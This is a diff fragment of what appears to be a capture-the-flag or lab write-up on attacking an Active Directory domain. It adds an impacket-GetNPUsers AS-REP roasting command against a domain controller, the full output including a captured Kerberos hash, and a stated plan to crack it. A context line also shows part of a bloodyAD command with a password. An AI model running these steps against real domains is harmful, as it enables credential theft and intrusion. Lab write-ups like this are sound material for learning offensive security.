@@ -507,5 +507,24 @@ bloodyAD --host dc01.fragments.local -d fragments.local -u j.woods -p 'hpFqULtQo
 Now the account is enabled and AS-REP roastable i can dump the hash
 
 ```python
+impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip '10.0.29.162' 'fragments.local/'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User FRG0310$ doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User PROD$ doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$o.rodrigo@FRAGMENTS.LOCAL:dedd90af65196a4b0cb853d2f8006588$a53ee4a6919462a6355c2e14b04f3679de49e30798fed5f4948a98f0635abb1bedb2f75a718b7dec7e52c1485076361d955e34f762f23c0de39bd3ef0a02eeb9f4db8f4ce94d49970dc6a8b8ccc6b97706396d8ab2f4fa8982cc0867f8dd305a7f8f9a9fa6cb62ad6098091b6961b814a80234bfa2cf0ef4105a67db0aaaadb6d7825b283ce78955ad776d0af58def226e058e1c74e089356b0a35ff21d9c4a0775585f19cea038c858d6bfb7b871fcd173a3f1221aef1bb364d089ab7f2fec9622499ff2459d8f7058a39011cbdfd252f52ab3420578c1b246eb1fe8a0269c89a480a3a2a083d57b8d8ecaa0c9011054f57
+[-] User j.woods doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User d.goggins doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User c.white doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sharedadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+I now have the hash, so ill try to crack it!
+
+```python
 
 ```
